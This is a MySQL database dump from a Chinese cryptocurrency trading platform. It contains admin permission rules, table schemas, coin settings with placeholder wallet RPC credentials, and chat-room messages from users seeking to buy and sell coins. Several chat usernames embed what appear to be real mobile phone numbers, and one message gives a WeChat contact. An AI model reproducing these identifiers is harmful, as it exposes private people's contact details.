INSERT INTO `movesay_auth_rule` VALUES ('1884', 'admin', '1', 'Admin/User/coin', '用户财产', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1885', 'admin', '1', 'Admin/Finance/myzc', '虚拟币转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1886', 'admin', '1', 'Admin/Config/daohang', '导航配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1887', 'admin', '1', 'Admin/User/myzc_qr', '确认转出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1888', 'admin', '1', 'Admin/User/goods', '联系地址', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1889', 'admin', '1', 'Admin/Article/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1890', 'admin', '1', 'Admin/Finance/myczStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1891', 'admin', '1', 'Admin/Finance/myczQueren', '确认到账', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1892', 'admin', '1', 'Admin/Article/typeStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1893', 'admin', '1', 'Admin/Article/linkStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1894', 'admin', '1', 'Admin/Article/adverStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1895', 'admin', '1', 'Admin/Article/adverImage', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1896', 'admin', '1', 'Admin/User/coinlogs', '用户财产日志', '1', '');

-- ----------------------------
-- Table structure for `movesay_bazaar`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar`;
CREATE TABLE `movesay_bazaar` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `deal` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(2) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='集市交易表';

-- ----------------------------
-- Records of movesay_bazaar
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_bazaar_config`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_config`;
CREATE TABLE `movesay_bazaar_config` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `market` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '市场名称',
  `price_min` decimal(20,8) unsigned NOT NULL COMMENT '最小交易价格',
  `price_max` decimal(20,8) unsigned NOT NULL COMMENT '最大交易价格',
  `num_mix` decimal(20,8) unsigned NOT NULL COMMENT '最小交易数量',
  `num_max` decimal(20,8) unsigned NOT NULL COMMENT '最大交易数量',
  `invit_coin` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '上家赠送币种',
  `invit_1` decimal(20,8) unsigned NOT NULL COMMENT '一代赠送比例',
  `invit_2` decimal(20,8) unsigned NOT NULL COMMENT '二代赠送比例',
  `invit_3` decimal(20,8) unsigned NOT NULL COMMENT '三代赠送比例',
  `fee` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '手续费',
  `default` tinyint(2) unsigned NOT NULL COMMENT '默认',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(2) unsigned NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `coinname` (`market`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_bazaar_config
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_bazaar_invit`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_invit`;
CREATE TABLE `movesay_bazaar_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `invit` int(11) unsigned NOT NULL,
  `name` varchar(50) CHARACTER SET utf8 NOT NULL,
  `type` varchar(50) CHARACTER SET utf8 NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_bazaar_invit
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_bazaar_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_bazaar_log`;
CREATE TABLE `movesay_bazaar_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `peerid` int(11) unsigned NOT NULL,
  `coin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`),
  KEY `peerid` (`peerid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='集市交易记录表';

-- ----------------------------
-- Records of movesay_bazaar_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_category`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_category`;
CREATE TABLE `movesay_category` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '分类ID',
  `name` varchar(30) NOT NULL COMMENT '标志',
  `title` varchar(50) NOT NULL COMMENT '标题',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级分类ID',
  `sort` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序（同级有效）',
  `list_row` tinyint(3) unsigned NOT NULL DEFAULT '10' COMMENT '列表每页行数',
  `meta_title` varchar(50) NOT NULL DEFAULT '' COMMENT 'SEO的网页标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键字',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  `template_index` varchar(100) NOT NULL COMMENT '频道页模板',
  `template_lists` varchar(100) NOT NULL COMMENT '列表页模板',
  `template_detail` varchar(100) NOT NULL COMMENT '详情页模板',
  `template_edit` varchar(100) NOT NULL COMMENT '编辑页模板',
  `model` varchar(100) NOT NULL DEFAULT '' COMMENT '关联模型',
  `type` varchar(100) NOT NULL DEFAULT '' COMMENT '允许发布的内容类型',
  `link_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '外链',
  `allow_publish` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '是否允许发布内容',
  `display` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '可见性',
  `reply` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '是否允许回复',
  `check` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '发布的文章是否需要审核',
  `reply_model` varchar(100) NOT NULL DEFAULT '',
  `extend` text NOT NULL COMMENT '扩展设置',
  `create_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '数据状态',
  `icon` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '分类图标',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_name` (`name`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='分类表';

-- ----------------------------
-- Records of movesay_category
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_chat`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_chat`;
CREATE TABLE `movesay_chat` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` varchar(20) NOT NULL,
  `username` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=114 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='文字聊天表';

-- ----------------------------
-- Records of movesay_chat
-- ----------------------------
INSERT INTO `movesay_chat` VALUES ('4', '16', 'pppppp', '11', '0', '1504545331', '0', '1');
INSERT INTO `movesay_chat` VALUES ('5', '4877', 'myworld111', 'uu', '0', '1504547172', '0', '1');
INSERT INTO `movesay_chat` VALUES ('6', '16', 'pppppp', 'qqwqw', '0', '1504622403', '0', '1');
INSERT INTO `movesay_chat` VALUES ('7', '16', 'pppppp', 'wqqqwhhhhhhhhhhhhhhh', '0', '1504622420', '0', '1');
INSERT INTO `movesay_chat` VALUES ('8', '4944', 'LX103', '1111', '0', '1505466283', '0', '1');
INSERT INTO `movesay_chat` VALUES ('9', '5213', 'my000000', '11', '0', '1505721423', '0', '1');
INSERT INTO `movesay_chat` VALUES ('10', '5308', 'w123456', '7666585', '0', '1505893202', '0', '1');
INSERT INTO `movesay_chat` VALUES ('11', '5308', 'w123456', 'j8855，平安', '0', '1505893225', '0', '1');
INSERT INTO `movesay_chat` VALUES ('16', '5858', 'j13956264717', '太好用了', '0', '1508393752', '0', '1');
INSERT INTO `movesay_chat` VALUES ('13', '5245', 'sxx188', '哈哈', '0', '1505982862', '0', '1');
INSERT INTO `movesay_chat` VALUES ('14', '5027', 'lygzs1', '这个交易量是几点更新？有谁知道啊', '0', '1506400311', '0', '1');
INSERT INTO `movesay_chat` VALUES ('15', '5245', 'sxx188', '求币', '0', '1506683790', '0', '1');
INSERT INTO `movesay_chat` VALUES ('17', '5187', 'lclsy88', '太棒了', '0', '1508394213', '0', '1');
INSERT INTO `movesay_chat` VALUES ('18', '5839', 'lzy123456', '111', '0', '1508394323', '0', '1');
INSERT INTO `movesay_chat` VALUES ('19', '5839', 'lzy123456', '1币难求啊', '0', '1508394349', '0', '1');
INSERT INTO `movesay_chat` VALUES ('20', '5410', 'luoqiongqiong', '哎呦喂，试了下，都没有卖的吗', '0', '1508394400', '0', '1');
INSERT INTO `movesay_chat` VALUES ('21', '5119', 'w17638563237', '从哪里看挂单', '0', '1508394434', '0', '1');
INSERT INTO `movesay_chat` VALUES ('22', '6994', 'lwh12345678', '哎，买不到啊，眼看着涨', '0', '1508394441', '0', '1');
INSERT INTO `movesay_chat` VALUES ('23', '5751', 'stars1', '求币', '0', '1508396013', '0', '1');
INSERT INTO `movesay_chat` VALUES ('24', '6750', 'mai17817600511', '买买买', '0', '1508396870', '0', '1');
INSERT INTO `movesay_chat` VALUES ('25', '7002', 'a13057731008', '怎么操作不操哦', '0', '1508397070', '0', '1');
INSERT INTO `movesay_chat` VALUES ('26', '7002', 'a13057731008', '怎么操作不懂哦', '0', '1508397116', '0', '1');
INSERT INTO `movesay_chat` VALUES ('27', '5198', 'zcb123456', '我的币点了老是不付款', '0', '1508398185', '0', '1');
INSERT INTO `movesay_chat` VALUES ('28', '5773', 'mqq18008652722', '哈哈', '0', '1508408800', '0', '1');
INSERT INTO `movesay_chat` VALUES ('29', '5773', 'mqq18008652722', '哈哈', '0', '1508408813', '0', '1');
INSERT INTO `movesay_chat` VALUES ('30', '5773', 'mqq18008652722', '哈哈', '0', '1508409413', '0', '1');
INSERT INTO `movesay_chat` VALUES ('31', '5773', 'mqq18008652722', '大家好', '0', '1508409424', '0', '1');
INSERT INTO `movesay_chat` VALUES ('32', '7042', 'Lj18610862865', '这个好用', '0', '1508410959', '0', '1');
INSERT INTO `movesay_chat` VALUES ('33', '5458', 'zbl13323949288', '我的币在这里看不到！', '0', '1508413126', '0', '1');
INSERT INTO `movesay_chat` VALUES ('34', '4890', 'ly13939713630', '我也看不到币', '0', '1508414151', '0', '1');
INSERT INTO `movesay_chat` VALUES ('35', '4889', 'lgx666', '这个好', '0', '1508415524', '0', '1');
INSERT INTO `movesay_chat` VALUES ('36', '6590', 'zhangxs', '看不到我的币呀', '0', '1508415890', '0', '1');
INSERT INTO `movesay_chat` VALUES ('37', '4899', 'lhq13781080587', '一币难求啊', '0', '1508416638', '0', '1');
INSERT INTO `movesay_chat` VALUES ('38', '5326', 'AC6789', '等着', '0', '1508416849', '0', '1');
INSERT INTO `movesay_chat` VALUES ('39', '5326', 'AC6789', '卖币', '0', '1508416869', '0', '1');
INSERT INTO `movesay_chat` VALUES ('40', '6491', 'jxg1986520', '这个APp怎么操作啊', '0', '1508420647', '0', '1');
INSERT INTO `movesay_chat` VALUES ('41', '5913', 'lamtsui', '谁买币', '0', '1508460023', '0', '1');
INSERT INTO `movesay_chat` VALUES ('42', '6032', 'L1905066158', '常平昨天对接了一个团队要一万多币都没有', '0', '1508461280', '0', '1');
INSERT INTO `movesay_chat` VALUES ('43', '5882', 'aa074531', '我有', '0', '1508468723', '0', '1');
INSERT INTO `movesay_chat` VALUES ('44', '5882', 'aa074531', '谁要币', '0', '1508468744', '0', '1');
INSERT INTO `movesay_chat` VALUES ('45', '6557', 'lj18674805575', '没有币卖啊', '0', '1508470704', '0', '1');
INSERT INTO `movesay_chat` VALUES ('46', '4899', 'lhq13781080587', '明天八元', '0', '1508489704', '0', '1');
INSERT INTO `movesay_chat` VALUES ('47', '7084', 'xt6321', '……', '0', '1508493122', '0', '1');
INSERT INTO `movesay_chat` VALUES ('48', '6272', 'lslvip', '我有币', '0', '1508494026', '0', '1');
INSERT INTO `movesay_chat` VALUES ('49', '5893', 'z13525295635', '谁卖币啊，我抢不到', '0', '1508498559', '0', '1');
INSERT INTO `movesay_chat` VALUES ('50', '5893', 'z13525295635', '有币的去挂6000枚', '0', '1508498578', '0', '1');
INSERT INTO `movesay_chat` VALUES ('51', '6277', 'chenmm007', '求币3000个', '0', '1508499949', '0', '1');
INSERT INTO `movesay_chat` VALUES ('52', '5238', 'g18257722783', '是那个点了我币不打钱呀', '0', '1508503712', '0', '1');
INSERT INTO `movesay_chat` VALUES ('53', '5238', 'g18257722783', '怎么联系客服呀，那个晓得', '0', '1508503779', '0', '1');
INSERT INTO `movesay_chat` VALUES ('54', '6394', 'zhuruhe', '怎么买卖的我还不懂得怎么操作呢？有谁懂吗', '0', '1508506663', '0', '1');
INSERT INTO `movesay_chat` VALUES ('55', '7110', 'mmm5500', '我买币！！！', '0', '1508510321', '0', '1');
INSERT INTO `movesay_chat` VALUES ('56', '7110', 'mmm5500', '有没有人卖币？快要睡觉了哦', '0', '1508510492', '0', '1');
INSERT INTO `movesay_chat` VALUES ('57', '5186', 'wx2323', '好啊', '0', '1508510536', '0', '1');
INSERT INTO `movesay_chat` VALUES ('58', '7110', 'mmm5500', '那挂单去啊', '0', '1508510629', '0', '1');
INSERT INTO `movesay_chat` VALUES ('59', '7110', 'mmm5500', '我买3000币，有谁要卖？', '0', '1508511489', '0', '1');
INSERT INTO `movesay_chat` VALUES ('60', '7110', 'mmm5500', '晚安啦！', '0', '1508511686', '0', '1');
INSERT INTO `movesay_chat` VALUES ('61', '7111', 'lym1953', '我要买币谁有', '0', '1508579063', '0', '1');
INSERT INTO `movesay_chat` VALUES ('62', '5823', 'qq88483700', '要', '0', '1508581561', '0', '1');
INSERT INTO `movesay_chat` VALUES ('63', '5823', 'qq88483700', '我要1100', '0', '1508581590', '0', '1');
INSERT INTO `movesay_chat` VALUES ('64', '5823', 'qq88483700', '我要1100', '0', '1508581622', '0', '1');
INSERT INTO `movesay_chat` VALUES ('65', '5823', 'qq88483700', '我要1100 ', '0', '1508581634', '0', '1');
INSERT INTO `movesay_chat` VALUES ('66', '4889', 'lgx666', '买不到币啊', '0', '1508588016', '0', '1');
INSERT INTO `movesay_chat` VALUES ('67', '7341', 'he168001', '要币的加微信heyufu', '0', '1508681046', '0', '1');
INSERT INTO `movesay_chat` VALUES ('68', '6397', 'zk200258', '想要提高交易量多挂几次！别一次性挂单！', '0', '1508725554', '0', '1');
INSERT INTO `movesay_chat` VALUES ('69', '7406', 'zs107123', '我卖', '0', '1508773631', '0', '1');
INSERT INTO `movesay_chat` VALUES ('70', '7975', 'a1228932461', '钱包标识是什么，在那看', '0', '1509441783', '0', '1');
INSERT INTO `movesay_chat` VALUES ('71', '7329', 'bgl888', '好', '0', '1509789213', '0', '1');
INSERT INTO `movesay_chat` VALUES ('72', '6664', 'lks18660517601', '怎么联系客服', '0', '1510031718', '0', '1');
INSERT INTO `movesay_chat` VALUES ('73', '7424', 'lan13428990630', '大家好', '0', '1510036035', '0', '1');
INSERT INTO `movesay_chat` VALUES ('74', '7424', 'lan13428990630', '谁有', '0', '1510036072', '0', '1');
INSERT INTO `movesay_chat` VALUES ('75', '5916', 'shq666888', '谁存币，我买', '0', '1510054790', '0', '1');
INSERT INTO `movesay_chat` VALUES ('76', '7362', 'wukong', '有人吗', '0', '1510101421', '0', '1');
INSERT INTO `movesay_chat` VALUES ('77', '5410', 'luoqiongqiong', '有卖币的吗', '0', '1510114486', '0', '1');
INSERT INTO `movesay_chat` VALUES ('78', '7398', 'tym1009', '客服电话是多少？各种算力今天总么下调了哟', '0', '1510134267', '0', '1');
INSERT INTO `movesay_chat` VALUES ('79', '7398', 'tym1009', '欧亚交易平台这个是调整好的版本吗？总么好', '0', '1510134423', '0', '1');
INSERT INTO `movesay_chat` VALUES ('80', '7398', 'tym1009', '欧亚交易平台这个是调整好的版本吗？总么好', '0', '1510134435', '0', '1');
INSERT INTO `movesay_chat` VALUES ('81', '7398', 'tym1009', '欧亚交易平台这个是调整好的版本吗？总么好', '0', '1510134448', '0', '1');
INSERT INTO `movesay_chat` VALUES ('82', '5498', 'hxx1314', '怎么联系客服', '0', '1510205289', '0', '1');
INSERT INTO `movesay_chat` VALUES ('83', '8794', 'wW230811', '如何买币', '0', '1510209189', '0', '1');
INSERT INTO `movesay_chat` VALUES ('84', '7424', 'lan13428990630', '谁要', '0', '1510209659', '0', '1');
INSERT INTO `movesay_chat` VALUES ('85', '7424', 'lan13428990630', '怎么卖？', '0', '1510209745', '0', '1');
INSERT INTO `movesay_chat` VALUES ('86', '5877', 'm13996290760', '请问有在线客服吗？', '0', '1510222899', '0', '1');
INSERT INTO `movesay_chat` VALUES ('87', '8771', 'd13424120921', 'nihao你好', '0', '1510298541', '0', '1');
INSERT INTO `movesay_chat` VALUES ('88', '8771', 'd13424120921', '134', '0', '1510298578', '0', '1');
INSERT INTO `movesay_chat` VALUES ('89', '8771', 'd13424120921', '134', '0', '1510298590', '0', '1');
INSERT INTO `movesay_chat` VALUES ('90', '7314', 'x936768', '我要买币，怎么操作？', '0', '1510308266', '0', '1');
INSERT INTO `movesay_chat` VALUES ('91', '8989', 'kwf336336', '在那儿能看自己的币数', '0', '1510311679', '0', '1');
INSERT INTO `movesay_chat` VALUES ('92', '5916', 'shq666888', '谁有币，我要', '0', '1510321806', '0', '1');
INSERT INTO `movesay_chat` VALUES ('93', '9016', 'humen1864', '我没有', '0', '1510323478', '0', '1');
INSERT INTO `movesay_chat` VALUES ('94', '4895', 'y13522263948', '谁有币卖？', '0', '1510359448', '0', '1');
INSERT INTO `movesay_chat` VALUES ('95', '5124', 'g13051593638', '我要卖币，怎么操作', '0', '1510361863', '0', '1');
INSERT INTO `movesay_chat` VALUES ('96', '7391', 'l352684917', '我没看到过卖单，只有买单，咋回事呢？', '0', '1510365878', '0', '1');
INSERT INTO `movesay_chat` VALUES ('97', '7424', 'lan13428990630', '怎么卖？谁知道啊？', '0', '1510372188', '0', '1');
INSERT INTO `movesay_chat` VALUES ('98', '8784', 'fucan008', '客服怎么联系？', '0', '1510390725', '0', '1');
INSERT INTO `movesay_chat` VALUES ('99', '7883', 'a18389382719', '很不错，抓住机会，财富', '0', '1510405060', '0', '1');
INSERT INTO `movesay_chat` VALUES ('112', '9659', 'a12345678', '你好', '0', '1511711784', '0', '1');
INSERT INTO `movesay_chat` VALUES ('106', '5670', 'hlf18537713131', '有人吗', '0', '1510488213', '0', '1');
INSERT INTO `movesay_chat` VALUES ('107', '9155', 'a235288', '又要卖的吗', '0', '1510488471', '0', '1');
INSERT INTO `movesay_chat` VALUES ('108', '9246', 'cxl17610781319', '不错', '0', '1510574050', '0', '1');
INSERT INTO `movesay_chat` VALUES ('109', '9246', 'cxl17610781319', '没有币买啦', '0', '1510574479', '0', '1');
INSERT INTO `movesay_chat` VALUES ('113', '9659', 'a12345678', '你好', '0', '1512371389', '0', '1');

-- ----------------------------
-- Table structure for `movesay_coin`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin`;
CREATE TABLE `movesay_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `img` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `fee_bili` varchar(50) NOT NULL,
  `endtime` int(11) unsigned NOT NULL COMMENT '',
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) unsigned NOT NULL,
  `fee_meitian` varchar(200) NOT NULL COMMENT '每天限制',
  `dj_zj` varchar(200) NOT NULL,
  `dj_dk` varchar(200) NOT NULL,
  `dj_yh` varchar(200) NOT NULL,
  `dj_mm` varchar(200) NOT NULL,
  `zr_zs` varchar(50) NOT NULL,
  `zr_jz` varchar(50) NOT NULL,
  `zr_dz` varchar(50) NOT NULL,
  `zr_sm` varchar(50) NOT NULL,
  `zc_sm` varchar(50) NOT NULL,
  `zc_fee` varchar(50) NOT NULL,
  `zc_user` varchar(50) NOT NULL,
  `zc_min` varchar(50) NOT NULL,
  `zc_max` varchar(50) NOT NULL,
  `zc_jz` varchar(50) NOT NULL,
  `zc_zd` varchar(50) NOT NULL,
  `js_yw` varchar(50) NOT NULL,
  `js_sm` text NOT NULL,
  `js_sm_en` text,
  `js_qb` varchar(50) NOT NULL,
  `js_ym` varchar(50) NOT NULL,
  `js_gw` varchar(50) NOT NULL,
  `js_lt` varchar(50) NOT NULL,
  `js_wk` varchar(50) NOT NULL,
  `cs_yf` varchar(50) NOT NULL,
  `cs_sf` varchar(50) NOT NULL,
  `cs_fb` varchar(50) NOT NULL,
  `cs_qk` varchar(50) NOT NULL,
  `cs_zl` varchar(50) NOT NULL,
  `cs_cl` varchar(50) NOT NULL,
  `cs_zm` varchar(50) NOT NULL,
  `cs_nd` varchar(50) NOT NULL,
  `cs_jl` varchar(50) NOT NULL,
  `cs_ts` varchar(50) NOT NULL,
  `cs_bz` varchar(50) NOT NULL,
  `tp_zs` varchar(50) NOT NULL,
  `tp_js` varchar(50) NOT NULL,
  `tp_yy` varchar(50) NOT NULL,
  `tp_qj` varchar(50) NOT NULL,
  `max_leiji` int(10) DEFAULT NULL,
  `max_meitian` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='币种配置表';

-- ----------------------------
-- Records of movesay_coin
-- ----------------------------
INSERT INTO `movesay_coin` VALUES ('7', 'usd', 'rmb', '美元', 'cny.png', '0', '', '0', '0', '1', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, null);
INSERT INTO `movesay_coin` VALUES ('13', 'pvc', 'rgb', 'PVC', '5a716036db5ae.png', '0', '0', '0', '0', '0', '', '', '', '', '', '0', '1', '1', '', '', '0.01', '', '0', '10000', '1', '10000', 'PVC', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, '40');
INSERT INTO `movesay_coin` VALUES ('15', 'ppc', 'qbb', '澳盈链', '5ab86ea647850.png', '0', '0', '0', '0', '1', '', '127.0.0.1', '21007', 'user', 'password', '0', '1', '1', '', '', '0', '', '0', '10000', '1', '100', 'Profound Profit Chain', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', null, null);

-- ----------------------------
-- Table structure for `movesay_coin_comment`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin_comment`;
CREATE TABLE `movesay_coin_comment` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `content` varchar(500) NOT NULL,
  `cjz` int(11) unsigned NOT NULL,
  `tzy` int(11) unsigned NOT NULL,
  `xcd` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_coin_comment
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_coin_json`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_coin_json`;
CREATE TABLE `movesay_coin_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `data` varchar(500) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=1947 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_coin_json
-- ----------------------------
INSERT INTO `movesay_coin_json` VALUES ('1731', 'sgc', '[0,0,null,null]', '', '0', '1505318399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1732', 'sgc', '[0,0,null,null]', '', '0', '1505404799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1733', 'sgc', '[0,0,null,null]', '', '0', '1505491199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1734', 'sgc', '[0,0,null,null]', '', '0', '1505577599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1735', 'sgc', '[0,0,null,null]', '', '0', '1505663999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1736', 'sgc', '[500000,0,null,null]', '', '0', '1505750399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1737', 'sgc', '[2520740.9,0,null,null]', '', '0', '1505836799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1738', 'sgc', '[2897344.9,0,null,null]', '', '0', '1505923199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1739', 'sgc', '[3291478.395,0,null,null]', '', '0', '1506009599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1740', 'sgc', '[3099830.395,0,null,null]', '', '0', '1506095999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1741', 'sgc', '[1804670.80485,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506182399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1742', 'sgc', '[840637.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506268799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1743', 'sgc', '[840637.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506355199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1744', 'sgc', '[840637.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506441599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1745', 'sgc', '[840637.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506527999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1746', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506614399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1747', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506700799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1748', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506787199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1749', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506873599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1750', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1506959999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1751', 'sgc', '[840620.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1507046399', '0', '0');
